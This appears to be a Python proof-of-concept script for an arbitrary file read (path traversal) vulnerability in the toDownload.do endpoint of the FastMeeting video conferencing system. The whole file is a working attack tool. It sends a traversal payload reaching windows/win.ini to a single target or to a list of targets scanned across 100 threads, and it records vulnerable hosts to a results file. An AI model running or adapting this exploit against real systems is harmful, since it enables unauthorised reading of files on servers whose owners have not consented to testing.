import argparse,requests,sys,time,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    test ="""

███████╗ █████╗ ███████╗████████╗███╗   ███╗███████╗███████╗████████╗██╗███╗   ██╗ ██████╗ 
██╔════╝██╔══██╗██╔════╝╚══██╔══╝████╗ ████║██╔════╝██╔════╝╚══██╔══╝██║████╗  ██║██╔════╝ 
█████╗  ███████║███████╗   ██║   ██╔████╔██║█████╗  █████╗     ██║   ██║██╔██╗ ██║██║  ███╗
██╔══╝  ██╔══██║╚════██║   ██║   ██║╚██╔╝██║██╔══╝  ██╔══╝     ██║   ██║██║╚██╗██║██║   ██║
██║     ██║  ██║███████║   ██║   ██║ ╚═╝ ██║███████╗███████╗   ██║   ██║██║ ╚████║╚██████╔╝
╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝     ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                                                                                                                                                                                                    
"""
    print(test)


def main():
    banner()
    parse = argparse.ArgumentParser(description="好视通视频会议系统(fastmeeting) toDownload.do接口存在任意文件读取漏洞POC")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    api_payload = "/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini"
    headers = {
        'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept':'*/*',
        'Connection':'Keep-Alive',
    }
    try:
        res1 = requests.get(url=target+api_payload,headers=headers,verify=False,timeout=10)
        if res1.status_code==200 and 'files' in res1.text:
            print(f"[+]{target} 存在任意文件读取漏洞")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在任意文件读取漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")